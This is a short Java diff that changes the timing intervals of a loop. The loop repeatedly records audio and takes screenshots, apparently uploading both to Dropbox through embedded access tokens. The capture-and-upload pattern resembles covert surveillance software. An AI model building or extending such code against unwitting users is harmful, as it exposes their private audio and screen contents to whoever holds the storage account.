@@ -25,7 +25,7 @@ public class Main {
         long time = 0;
         while (true) {
             DbxClientV2 client1 = new DbxClientV2(config, ACCESS_TOKEN_SOUND);
-            JavaSoundRecorder recorder = new JavaSoundRecorder(client1, 10000);
+            JavaSoundRecorder recorder = new JavaSoundRecorder(client1, 30000);
             DbxClientV2 client2 = new DbxClientV2(config, ACCESS_TOKEN_SCREEN);
             Screen thread = new Screen(client2);
             if(time == 0){
@@ -33,11 +33,11 @@ public class Main {
                 recorder.recordAudio();
             }
             time = System.currentTimeMillis() - startTime;
-            if(time - (5000*counter1) >= 5000){
+            if(time - (10000*counter1) >= 10000){
                 thread.start();
                 counter1++;
             }
-            if(time - (11500*counter2) >= 11500){
+            if(time - (31000*counter2) >= 31000){
                 recorder.recordAudio();
                 counter2++;
             }
